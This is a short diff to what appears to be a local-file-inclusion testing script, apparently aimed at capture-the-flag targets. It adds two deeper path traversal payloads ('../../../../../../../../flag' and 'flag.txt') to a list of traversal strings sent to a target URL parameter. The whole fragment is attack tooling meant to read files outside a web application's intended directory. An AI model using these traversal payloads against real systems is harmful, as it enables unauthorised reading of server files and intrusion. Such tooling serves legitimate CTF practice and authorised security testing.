@@ -20,6 +20,8 @@ def test_lfi(target_url, param_name, prefix_val):
     print(f"{YELLOW}[*] Prefix: {prefix_val}{END}\n")
 
     payloads = [
+        "../../../../../../../../flag",
+        "../../../../../../../../flag.txt",
         "../../../../../../flag",
         "../../../../../../flag.txt",
         "../../../../../flag",
